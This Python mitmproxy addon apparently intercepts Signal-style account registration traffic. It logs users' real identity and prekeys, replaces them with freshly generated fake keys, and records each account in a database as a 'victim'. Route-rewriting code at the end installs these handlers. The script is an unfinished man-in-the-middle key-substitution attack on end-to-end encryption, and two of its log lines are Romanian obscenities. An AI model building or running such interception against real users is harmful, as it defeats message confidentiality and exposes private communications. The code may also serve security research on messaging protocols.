from mitmproxy.http import HTTPFlow
#from mitmproxy import ctx
import logging
from xepor import InterceptedAPI, RouteType
import json
from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers
from base64 import b64decode, b64encode
from database import *
from utils import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN
api = addons[0]

@api.route("/v1/registration")
def _v1_registration(flow: HTTPFlow):

    req = json.loads(flow.request.content)
    logging.info("reg")
    logging.info(json.dumps(req, indent=4))

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = req['aciSignedPreKey']
    pni_SignedPreKey = req['pniSignedPreKey']

    aci_pq_lastResortKey = req['aciPqLastResortPreKey']
    pni_pq_lastResortKey = req['pniPqLastResortPreKey']

    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()

    fake_pre_keys, secret_keys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)

    req.update(fake_pre_keys)

    #### Save keys to the database

    resp = json.loads(flow.response.content)

    resp["number"]
    resp["uuid"]
    resp["pni"]
    
    user = (User
           .insert(pNumber = resp["number"], aci = resp["uuid"], pni = resp["pni"], isVictim = True)
           .on_conflict_replace()
           .execute())

    qry = User.select().dicts()

    for i, user in enumerate(qry):
        logging.info(f"{i}:{user}")

    ### TODO: create the Alice classes 

    logging.info((json.dumps(req, indent=4)))

# @api.route("/v1/verification") 
def _v1_verification(flow):
    logging.info(flow.request.content)


logging.warning("pulă")
logging.warning(api.find_handler(HOST_HTTPBIN, "/v1/registration")[0])
for idx, (host, parser, handler) in enumerate(api.request_routes):
    if host != HOST_HTTPBIN:
        continue

    parse_result = parser.parse("/v1/registration")
    if parse_result is not None:
        logging.warning(handler)
        handler = _v1_registration
        api.request_routes[idx] = (host, parser, handler)

    parse_result = parser.parse("/v1/verification")
    if parse_result is not None:
        handler = _v1_verification
        api.request_routes[idx] = (host, parser, handler)

logging.warning(api.find_handler(HOST_HTTPBIN, "/v1/registration")[0])
logging.warning("chizda mă-tii")
# reg = api.find_handler(HOST_HTTPBIN, "/v1/registration")[0]
# logging.warning(reg)
# reg = _v1_registration
# logging.warning(reg)
# logging.warning(api.find_handler(HOST_HTTPBIN, "/v1/registration")[0])
# api.v1_verification = _v1_verification

addons = [api]